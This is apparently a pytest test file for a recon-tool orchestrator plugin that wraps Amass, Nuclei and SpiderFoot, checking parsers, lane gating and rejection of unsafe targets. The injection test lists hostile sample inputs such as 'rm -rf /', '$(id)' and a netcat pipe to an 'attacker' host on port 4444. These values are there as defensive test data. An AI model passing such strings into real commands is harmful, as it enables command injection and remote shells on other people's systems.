"""Meta Orchestrator (meta_orchestrator) tests.

Layers:
1. Parsers against fixture outputs in the real tools' shapes:
   Amass -json lines, Nuclei -jsonl, SpiderFoot JSON events.
2. Target translation: framework targets become safe tool
   arguments; injection-shaped targets are rejected.
3. Maltego mapper: edges come only from real discovery-bus assets.
4. Lane gating: no engine executes without the heavy opt-in (one
   info finding instead); absent binaries skip silently.
5. End-to-end run with run_tool stubbed (no subprocess, no network).
6. Source hygiene: the two defects of the original pasted draft -
   shell-string subprocess construction and a mock adapter emitting
   fabricated findings - must never come back.
"""
import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.plugins import meta_orchestrator as meta  # noqa: E402
from app.plugins.base import Ctx, Target  # noqa: E402
from app.plugins.registry import discover  # noqa: E402


AMASS_OUT = "\n".join([
    '{"name":"api.example.com","addresses":[{"ip":"93.184.216.34"}]}',
    '{"name":"www.example.com","addresses":[{"ip":"93.184.216.34"}]}',
    '{"name":"api.example.com","addresses":[{"ip":"93.184.216.34"}]}',
    '{"name":"evil.other.org","addresses":[{"ip":"1.2.3.4"}]}',
    '{"name":"example.com","addresses":[{"ip":"93.184.216.34"}]}',
    "not json at all",
    '{"timestamp":"2026-01-01"}',
])

NUCLEI_OUT = "\n".join([
    '{"template-id":"CVE-2021-44228","info":{"name":"Apache Log4j2 '
    'RCE","severity":"critical","description":"Log4j JNDI lookup.",'
    '"classification":{"cve-id":["CVE-2021-44228"]}},'
    '"matched-at":"https://example.com/","matcher-name":"jndi",'
    '"host":"example.com","type":"http"}',
    '{"template-id":"missing-hsts","info":{"name":"Missing HSTS",'
    '"severity":"info"},"matched-at":"https://example.com/",'
    '"host":"example.com","type":"http"}',
    '{"template-id":"CVE-2021-44228","info":{"name":"dup",'
    '"severity":"critical"},"matched-at":"https://example.com/",'
    '"host":"example.com","type":"http"}',
    "{broken json",
])

SPIDERFOOT_ARRAY = """[
 {"generated": 1762000000, "type": "INTERNET_NAME",
  "data": "api.example.com", "module": "sfp_dnsresolve",
  "source": "example.com"},
 {"generated": 1762000001, "type": "EMAILADDR",
  "data": "admin@example.com", "module": "sfp_webframework",
  "source": "example.com"},
 {"generated": 1762000002, "type": "IP_ADDRESS",
  "data": "93.184.216.34", "module": "sfp_dnsresolve",
  "source": "example.com"},
 {"generated": 1762000003, "type": "TCP_PORT_OPEN",
  "data": "93.184.216.34:443", "module": "sfp_portscan_tcp",
  "source": "93.184.216.34"},
 {"generated": 1762000004, "type": "AFFILIATE_INTERNET_NAME",
  "data": "unrelated.example.net", "module": "sfp_similar",
  "source": "example.com"},
 {"generated": 1762000005, "type": "INTERNET_NAME",
  "data": "api.example.com", "module": "sfp_dnsresolve",
  "source": "example.com"}
]"""


def _ctx(mode="active", shared=None):
    ctx = Ctx(run_id="t", mode=mode, http=None, cache=None, keys={})
    if shared:
        ctx.shared.update(shared)
    return ctx


def _no_tools():
    return {n: {"available": False, "path": ""}
            for n in meta.TOOL_BUDGETS} | {
        "maltego_mapper": {"available": True, "path": ""}}


# ---------------------------------------------------------------------------
# 1. Parsers
# ---------------------------------------------------------------------------

def test_amass_parser_scope_and_dedupe():
    subs = meta.parse_amass(AMASS_OUT, "example.com")
    assert subs == ["api.example.com", "example.com",
                    "www.example.com"]


def test_amass_parser_empty_and_garbage():
    assert meta.parse_amass("", "example.com") == []
    assert meta.parse_amass("hello\nworld", "example.com") == []


def test_nuclei_parser_normalizes():
    hits = meta.parse_nuclei(NUCLEI_OUT)
    assert len(hits) == 2  # dupe + broken line dropped
    top = hits[0]
    assert top["template_id"] == "CVE-2021-44228"
    assert top["severity"] == "high"  # critical maps to high
    assert top["cves"] == ["CVE-2021-44228"]
    assert top["matched_at"] == "https://example.com/"
    assert hits[1]["severity"] == "low"  # info maps to low


def test_spiderfoot_parser_array_form():
    hits = meta.parse_spiderfoot(SPIDERFOOT_ARRAY)
    by_key = {(h["key"], h["value"]) for h in hits}
    assert ("subdomain", "api.example.com") in by_key
    assert ("email", "admin@example.com") in by_key
    assert ("ip_address", "93.184.216.34") in by_key
    assert ("open_port", "93.184.216.34:443") in by_key
    # unmapped event types are ignored, dupes collapsed
    assert len(hits) == 4


def test_spiderfoot_parser_jsonl_and_empty():
    line = ('{"type": "EMAILADDR", "data": "a@b.co", '
            '"module": "m", "source": "b.co"}')
    hits = meta.parse_spiderfoot(line)
    assert hits and hits[0]["value"] == "a@b.co"
    assert meta.parse_spiderfoot("") == []
    assert meta.parse_spiderfoot("[]") == []


# ---------------------------------------------------------------------------
# 2. Target translation / injection defense
# ---------------------------------------------------------------------------

def test_translate_domain_url_ip():
    d = meta.translate_target(Target(raw="Example.COM",
                                     type="domain"))
    assert d["host"] == "example.com" and d["domain"] == "example.com"
    u = meta.translate_target(Target(
        raw="https://Sub.Example.com:8443/path?q=1", type="url"))
    assert u["host"] == "sub.example.com"
    assert u["nuclei"].startswith("https://")
    i = meta.translate_target(Target(raw="93.184.216.34", type="ip"))
    assert i["host"] == "93.184.216.34" and i["domain"] == ""


def test_translate_rejects_injection():
    bad = [
        "example.com; rm -rf /",
        "example.com && id",
        "$(id).example.com",
        "-oProxyCommand=id",
        "exa mple.com",
        "example.com|nc attacker 4444",
        "https://user:pass@example.com/",
        "example.com`id`",
        "",
    ]
    for raw in bad:
        assert meta.translate_target(
            Target(raw=raw, type="domain")) is None, raw


# ---------------------------------------------------------------------------
# 3. Maltego mapper: real bus assets only
# ---------------------------------------------------------------------------

def test_maltego_edges_from_real_assets():
    shared = {"subdomains": ["api.example.com", "www.example.com",
                             "other.org"],
              "emails": ["admin@example.com", "x@other.org"]}
    edges = meta.maltego_edges(shared, "example.com")
    pairs = {(e["from"], e["to"], e["relation"]) for e in edges}
    assert ("api.example.com", "example.com",
            "resolves_under") in pairs
    assert ("admin@example.com", "example.com",
            "mailbox_domain") in pairs
    assert ("x@other.org", "other.org", "mailbox_domain") in pairs
    assert all(e["from"] != "other.org" for e in edges)


def test_maltego_edges_empty_bus():
    assert meta.maltego_edges({}, "example.com") == []
    assert meta.maltego_edges({"subdomains": []}, "example.com") == []


# ---------------------------------------------------------------------------
# 4/5. Lane gating + end-to-end (stubbed subprocess layer)
# ---------------------------------------------------------------------------

def test_plugin_metadata_and_registry():
    reg = discover()
    assert "meta_orchestrator" in reg
    plugin = reg["meta_orchestrator"]()
    assert plugin.lane == "heavy"
    assert plugin.group == "network"
    assert plugin.accepts == ["domain", "url", "ip"]
    assert plugin.requires_keys == []


def test_fast_lane_never_executes_engines(monkeypatch):
    monkeypatch.delenv("RECON_HEAVY_LANE", raising=False)
    avail = _no_tools()
    avail["nuclei"] = {"available": True, "path": "/bin/nuclei"}
    monkeypatch.setattr(meta, "availability", lambda: avail)

    async def _boom(*a, **k):
        raise AssertionError("engine executed in fast lane")
    monkeypatch.setattr(meta, "run_tool", _boom)

    ctx = _ctx(shared={"subdomains": ["api.example.com"]})
    res = asyncio.run(meta.MetaOrchestratorPlugin().run(
        Target(raw="example.com", type="domain"), ctx))
    keys = {(f.key) for f in res.findings}
    assert "heavy_lane_not_run" in keys
    assert "asset_edge" in keys  # bus mapping still ran


def test_heavy_lane_no_binaries_is_graceful(monkeypatch):
    monkeypatch.setattr(meta, "availability", _no_tools)
    ctx = _ctx(shared={"allow_heavy": True})
    res = asyncio.run(meta.MetaOrchestratorPlugin().run(
        Target(raw="example.com", type="domain"), ctx))
    assert res.status.value == "ok"
    assert res.findings == []
    assert "no external engine binaries" in res.reason


def test_heavy_lane_nuclei_end_to_end(monkeypatch):
    avail = _no_tools()
    avail["nuclei"] = {"available": True, "path": "/bin/nuclei"}
    monkeypatch.setattr(meta, "availability", lambda: avail)

    async def _fake_run_tool(cmd, cwd, budget):
        assert cmd[0] == "/bin/nuclei"
        assert "-exclude-tags" in cmd  # detection-only guardrail
        assert "-no-interactsh" in cmd
        return 0, NUCLEI_OUT, ""
    monkeypatch.setattr(meta, "run_tool", _fake_run_tool)

    ctx = _ctx(mode="active", shared={"allow_heavy": True})
    res = asyncio.run(meta.MetaOrchestratorPlugin().run(
        Target(raw="example.com", type="domain"), ctx))
    matches = [f for f in res.findings if f.key == "nuclei_match"]
    assert len(matches) == 2
    top = matches[0]
    assert isinstance(top.value, str)
    assert top.evidence["severity"] == "high"
    assert top.evidence["cve"] == "CVE-2021-44228"
    assert top.source == "nuclei"


def test_passive_mode_skips_active_engines(monkeypatch):
    avail = _no_tools()
    avail["nuclei"] = {"available": True, "path": "/bin/nuclei"}
    monkeypatch.setattr(meta, "availability", lambda: avail)

    async def _boom(*a, **k):
        raise AssertionError("active engine ran in passive mode")
    monkeypatch.setattr(meta, "run_tool", _boom)

    ctx = _ctx(mode="passive", shared={"allow_heavy": True})
    res = asyncio.run(meta.MetaOrchestratorPlugin().run(
        Target(raw="example.com", type="domain"), ctx))
    assert res.status.value == "ok"
    assert all(f.key != "nuclei_match" for f in res.findings)


def test_invalid_target_skips_cleanly(monkeypatch):
    monkeypatch.setattr(meta, "availability", _no_tools)
    ctx = _ctx(shared={"allow_heavy": True})
    res = asyncio.run(meta.MetaOrchestratorPlugin().run(
        Target(raw="example.com; id", type="domain"), ctx))
    assert res.status.value == "ok"
    assert res.findings == []


# ---------------------------------------------------------------------------
# 6. Source hygiene guards
# ---------------------------------------------------------------------------

def test_source_has_no_shell_or_mock():
    src = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                       "..", "app", "plugins", "meta_orchestrator.py")
    with open(src, encoding="utf-8") as fh:
        text = fh.read()
    assert "create_subprocess_shell" not in text
    assert "UA-XXXXX" not in text
    assert "_mock" not in text.lower()
    assert "create_subprocess_exec" in text
